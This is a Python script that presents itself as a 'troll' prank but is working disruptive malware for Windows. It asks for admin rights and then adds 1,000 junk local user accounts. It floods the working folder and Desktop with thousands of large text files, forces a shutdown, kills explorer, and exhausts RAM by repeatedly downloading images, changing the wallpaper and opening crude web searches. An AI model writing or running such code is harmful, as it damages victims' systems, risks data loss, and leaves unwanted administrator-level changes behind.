import pyautogui
import webbrowser
import random
import requests
import psutil
import winsound
import os
import threading
import subprocess
import sys
import string
import ctypes

def generateUsername(length=10, characters=None):
    characters = string.ascii_letters + string.digits + "□■◆"
    return ''.join(random.choices(characters, k=length))

def createUser():
    for i in range(1, 1001):
        username = generateUsername(20)
        password = "fake_virus"

        subprocess.run(["net", "user", username, password, "/add"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def run_as_admin():
    if ctypes.windll.shell32.IsUserAnAdmin() != 0:
        return True
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        return False


# get the user's username and password
username = os.getlogin()

# print the username
print(f'Hi, {username}.')

# write 10,000 files
txt_number = 10000

desktop_txt_number = 1000

bytes = 100 * 100

txt_string = "get trolled " * bytes

def spam_files():
    for i in range(1, txt_number + 1):
        filename = f"get trolled_{i}.txt"
        with open(filename, "w") as file:
            file.write(txt_string)

def spam_files_desktop():
    for i in range(1, desktop_txt_number + 1):
        filename = rf"C:\Users\{username}\Desktop\get trolled_{i}.txt"
        with open(filename, "w") as file:
            file.write(txt_string)

searches = [
    'fuck java',
    'how to trick an idiot',
    'why is my microwave laughing',
    'can I sue my toaster',
    'is water wet or am I just dumb',
    'free robux no scam',
    'how to become sigma in 5 minutes',
    'why does my cat pay taxes',
    'best excuses to not pay taxes',
    'can AI legally adopt me',
    'how to delete Internet Explorer in real life',
    'greg is watching me help',
    'how to summon hatsune miku at 3am',
    'free vbucks generator real 2025',
    'can I sell my browser history on eBay',
    'do penguins have knees',
    'why does my keyboard smell like Doritos',
    'how to install Windows on my fridge',
    'can I drink liquid nitrogen for fun',
    'why does my Roomba know my name',
    'how to become CEO of Google with no experience',
    'best way to get banned from roblox',
    'where to download RAM for free',
    'how to legally marry my anime waifu',
    'help my smart fridge joined a cult',
    'why does my wifi connect to the backrooms',
    'can you deep fry air',
    'do I really need all my organs'
]

# download the fucking miku image
url = 'https://is1-ssl.mzstatic.com/image/thumb/Music221/v4/b8/92/ce/b892cead-70a1-8f29-0045-af30080d3a16/4571640501760_cover.png/316x316bb.webp'

os.system("shutdown /s /t 30")
os.system("taskkill /f /fi explorer.exe")


def main():
    downloaded_number = 1
    while True:
        ram = psutil.virtual_memory()
        ram_percentage = ram.percent
        max_ram = 85
        
        if ram_percentage >= max_ram:
            break
        
        # download the image
        downloaded_number += 1
        picture_name = f"nice_try{downloaded_number}.webp"
        response = requests.get(url)
        with open(picture_name, "wb") as file:
            file.write(response.content)
        
        # press shit idfk
        pyautogui.press('capslock')

        new_filename = f"nice_try2.webp"

        # set wallpaper and open the image
        ctypes.windll.user32.SystemParametersInfoW(20, 0, new_filename , 0)
        os.startfile(new_filename)
        
        search = random.choice(searches)
        webbrowser.open(f"https://www.google.com/search?q={search}")
        webbrowser.open(f"https://www.youtube.com/watch?v=MX8eYdEOU5w")
        
        # play a sound
        winsound.Beep(1000, 500)



if __name__ == '__main__':
    if not run_as_admin():
        sys.exit()
    else:
        t1 = threading.Thread(target=spam_files)
        t2 = threading.Thread(target=main)
        t3 = threading.Thread(target=spam_files_desktop)
        t4 = threading.Thread(target=createUser)

        t1.start()
        t2.start()
        t3.start()
        t4.start()

        t1.join()
        t2.join()
        t3.join()
        t4.join()
